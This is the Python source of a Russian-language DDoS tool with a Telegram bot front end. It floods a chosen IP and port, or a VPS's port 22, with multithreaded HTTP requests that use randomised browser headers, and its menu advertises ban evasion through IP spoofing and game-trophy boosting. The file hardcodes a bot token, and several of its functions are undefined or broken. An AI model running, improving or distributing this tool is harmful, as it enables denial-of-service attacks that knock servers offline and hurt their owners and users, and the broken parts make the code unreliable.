import telebot
import threading
import socket
import random
import os
import colorama
from colorama import Fore
# Настройка бота
bot = telebot.TeleBot("7301831116:AAGFIbnaXqEAqOqknOsF8pNh-GlMFDejV1M")

# Обработчик команд
@bot.message_handler(commands=['start'])
def start(message):
  # Отправить приветственное сообщение
  bot.send_message(message.chat.id, "Привет! Я могу помочь тебе с DDoS-атаками.")

  # Отправить список доступных команд
  bot.send_message(message.chat.id, """
Доступные команды:

/tcpddos - DDoS TCP-порт
/vdsddos - DDoS сервера VPS/VDS
/ipspoof - Обход бана VPS/VDS
/trophpush - Накрутка трофеев
/alltcpddos - DDoS всех TCP-портов
""")

colorama.init(autoreset=True)

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
ref=['http://www.bing.com/search?q=',
'https://www.yandex.com/yandsearch?text=',
'https://duckduckgo.com/?q=']
acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept-Encoding: gzip, deflate\r\n",
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept-Language: en-US,en;q=0.5\r\n"]


ref = [
    'http://www.bing.com/search?q=',
    'https://www.yandex.com/yandsearch?text=',
    'https://duckduckgo.com/?q='
]

acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept-Language: en-US,en;q=0.5\r\n"
]

proxies = [
    "http://10.10.1.10:3128",
    "http://10.10.1.11:3128",
    "http://10.10.1.12:3128"
]

def stealdevtcpddos():
    ip = str(input(Fore.MAGENTA + 'IP: '))
    port = int(input(Fore.MAGENTA + 'PORT: '))
    pack = int(input(Fore.MAGENTA + 'Packets(желательно 22): '))
    thread = int(input(Fore.MAGENTA + 'Threads(желательно 200): '))
    
    def start():
        global ref, acceptall
        hh = random._urandom(3016)
        xx = int(0)
        accept = random.choice(acceptall)
        reffer = "Referer: " + random.choice(ref) + str(ip) + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\n"
        length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
        target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
        main_req = target_host + accept + reffer + content + length + "\r\n"
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(ip), int(port)))
                s.send(str.encode(main_req))
                for i in range(pack):
                    s.send(str.encode(main_req))
                xx += random.randint(0, int(pack))
                print(Fore.GREEN + "[DDOS BY STEALDEV STARTED] Махаем лапкой на сервер {0}:{1} | Отправлено: {2}".format(str(ip), int(port), xx))
            except:
                s.close()
                print(Fore.RED + '[DDOS BY STEALDEV COMPLETE] Сервер убит либо данные не верные.')

    for x in range(thread):
        thred = threading.Thread(target=start)
        thred.start()



def stealdevalltcp():
    ip = str(input(Fore.MAGENTA + 'IP: '))
    pack = int(input(Fore.MAGENTA + 'Packets(желательно 22): '))
    thread = int(input(Fore.MAGENTA + 'Threads(желательно 200): '))
    port = RandShort()
    
    def start():
        global ref, acceptall
        hh = random._urandom(3016)
        xx = int(0)
        accept = random.choice(acceptall)
        reffer = "Referer: " + random.choice(ref) + str(ip) + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\n"
        length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
        target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
        main_req = target_host + accept + reffer + content + length + "\r\n"
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(ip), int(port)))
                s.send(str.encode(main_req))
                for i in range(pack):
                    s.send(str.encode(main_req))
                xx += random.randint(0, int(pack))
                print(Fore.GREEN + "[DDOS BY STEALDEV STARTED] Махаем лапкой на сервер {0}:{1} | Отправлено: {2}".format(str(ip), int(port), xx))
            except:
                s.close()
                print(Fore.RED + '[DDOS BY STEALDEV COMPLETE] Сервер убит либо данные не верные.')

    for x in range(thread):
        thred = threading.Thread(target=start)
        thred.start()



def stealdevVDSddos():
    ip = str(input(Fore.MAGENTA + 'IP: '))
    port = 22
    pack = int(input(Fore.MAGENTA + 'Packets(желательно 22): '))
    thread = int(input(Fore.MAGENTA + 'Threads(желательно 200): '))
    
    def start():
        global ref, acceptall
        hh = random._urandom(3016)
        xx = int(0)
        accept = random.choice(acceptall)
        reffer = "Referer: " + random.choice(ref) + str(ip) + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\n"
        length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
        target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
        main_req = target_host + accept + reffer + content + length + "\r\n"
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(ip), 22))
                s.send(str.encode(main_req))
                for i in range(pack):
                    s.send(str.encode(main_req))
                xx += random.randint(0, int(pack))
                print(Fore.GREEN + "[DDOS BY STEALDEV STARTED] Махаем лапкой на сервер {0}:{1} | Отправлено: {2}".format(str(ip), int(port), xx))
            except:
                s.close()
                print(Fore.RED + '[DDOS BY STEALDEV COMPLETE] Сервер убит либо данные не верные.')

    for x in range(thread):
        thred = threading.Thread(target=start)
        thred.start()

def stealdevmanual():
    
    print(Fore.WHITE + "Мануалы по функциям:\n\n")
    print(Fore.RED + """
1 - ддос тсп порта                  2 - ддос вдс
3 - обход бана вдс                  4 - накрутка кубков(коляски)
5 - выйти из меню                   6 - ддос всех портов
7 - выход в главное меню
""")

    stealdevchoice = input("Выберите функцию: ")

    if stealdevchoice == '1':
        os.system('clear')
        print("""
Ддосит тсп порт, работает на почти всех серверах, эффективнее на зипках Alah Brawl.
    """)
        stealdevmanual()
    elif stealdevchoice == '3':
        os.system('clear')
        print("""
Обход бана вдс, ничего интересного, вдс принимает рандомный айпи.
    """)
        stealdevmanual()
    elif stealdevchoice == '2':
        os.system('clear')
        print("""
Ддосит 22 порт, можно и использовать просто первую функцию, но некоторые не знают про 22 порт.
    """)
        stealdevmanual()
    elif stealdevchoice == '4':
        os.system('clear')
        print("""
v0.3
    """)
        stealdevmanual()
    elif stealdevchoice == '5':
        os.system('clear')
        print("""
Обычный выход в меню XD
        stealdevmanual()
    """)
    elif stealdevchoice == '6':
        os.system('clear')
        print("""
Ддосит рандомные порты с обычным rand
    """)
        stealdevmanual()
    elif stealdevchoice == '7':
        os.system('clear')
        menu()
    else:
        print(Fore.RED + "ERROR: Unk command")


def menu():
    
    print("Этот код остается бесплатным за счет подписки на канал\nЕсли не трудно - подпишись на наш канал t.me/tcp_killer :3\n\n")
    print("""
1 - ддос тсп порта                  2 - ддос вдс
3 - обход бана вдс(v0.3)            4 - накрутка кубков(v0.3)
5 - выйти из меню                   6 - инструкции по функциям
7 - ддос всех портов
""")

    stealdevchoice = input("Выберите функцию: ")

    if stealdevchoice == '1':
        stealdevtcpddos()
    elif stealdevchoice == '3':
        ipspoof
    elif stealdevchoice == '2':
        stealdevVDSddos()
    elif stealdevchoice == '4':
        stealdevtrop()
    elif stealdevchoice == '5':
        sys.exit()
    elif stealdevchoice == '6':
        os.system('clear')
        stealdevmanual()
    elif stealdevchoice == '7':
        stealdevalltcp()
    else:
        print(Fore.RED + "Ура меня везут в медный бык")

if __name__ == "__main__":
    menu()
    